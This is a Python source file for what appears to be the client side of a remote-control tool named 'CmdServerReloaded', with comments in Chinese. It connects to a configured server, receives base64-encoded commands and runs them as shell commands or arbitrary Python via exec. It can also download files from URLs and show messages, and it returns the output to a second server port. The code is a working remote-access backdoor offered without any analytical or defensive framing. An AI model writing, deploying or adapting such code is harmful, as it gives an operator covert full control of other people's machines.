# TO-DO:自动重连
import os
import json
import socket
import urllib
from threading import Thread
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import base64
import getpass


def base64encode(string):
    return base64.b64encode(string.encode()).decode()


def base64decode(string):
    return base64.b64decode(string.encode()).decode()


s = socket.socket()
start_time = time.time()  # 起始运行时间

# 初始化服务器连接配置
if os.path.exists("config.json"):
    with open("config.json", "r") as config_file:
        config = json.load(config_file)
else:
    config = {
        "version": "1.0.0",
        "client-name": f"{socket.gethostname()}_{getpass.getuser()}",
        "local-port": "34567",
        "server-address": "127.0.0.1",
        "server-port": "8631",
        "fallback-server-port": "8632",
        "startup-message-time": "0"
    }
    with open("config.json", "w") as config_file:
        json.dump(config, config_file)
if config["startup-message-time"] != "0":
    os.system(
        f'msg %username% /time:{config["startup-message-time"]} "CmdServerReloaded | ClientName: {config["client-name"]} | LocalHTTP: {config["local-port"]} | ConnectToServer: {config["server-address"]}')


# 内置状态显示HTTP服务器
class Request(BaseHTTPRequestHandler):
    timeout = 5
    server_version = "Apache"

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        buf = f'''<title>CmdServerReloaded - Status</title>config.json {str(config)}
Version - {config["version"]}
HostName - {socket.gethostname()}
UserName - {getpass.getuser()}
HttpPort - {config["local-port"]}
ConnectServer - {config["server-address"]}
ConnectStatus - {False}
RunningTime - {time.time() - start_time}'''.replace("\n", "<br>")
        self.wfile.write(buf.encode("gb2312"))


def start_http_server():
    HTTPServer(('localhost',
                int(config["local-port"])),
               Request).serve_forever()


Thread(target=start_http_server).start()

# 远程操作函数


def e_download(url):
    urllib.request.urlretrieve(url, os.path.basename(url))


def e_python(code):
    exec(code)


def e_message(text):
    os.system(f'msg %username% "{text}"')


def execute(mode, line):
    if mode == "cmd":
        return subprocess.Popen(line,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                encoding='gb2312'
                                ).communicate()[0]
    elif mode == "download":
        Thread(target=e_download, args=(line,)).start()
        return "Done"
    elif mode == "python":
        Thread(target=e_python, args=(line,)).start()
        return "Done"
    elif mode == "message":
        Thread(target=e_message, args=(line,)).start()
        return "Done"
    elif mode == "username":
        return config["client-name"]


def execute_and_fallbackdata(data):
    res = execute(data[0], base64decode(data[1]))
    s2 = socket.socket()
    s2.connect((config["server-address"], int(config["fallback-server-port"])))
    s2.send(f'''{data[2]}|{base64encode(res)}'''.encode("UTF-8"))
    print(base64encode(res))
    s2.close()


def start_server_connection():
    global s
    s.connect((config["server-address"], int(config["server-port"])))
    while True:
        d = s.recv(1024000).decode('UTF-8')
        print(d)
        data = d.split("|")
        Thread(target=execute_and_fallbackdata, args=(data,)).start()


if __name__ == "__main__":
    Thread(target=start_server_connection).start()
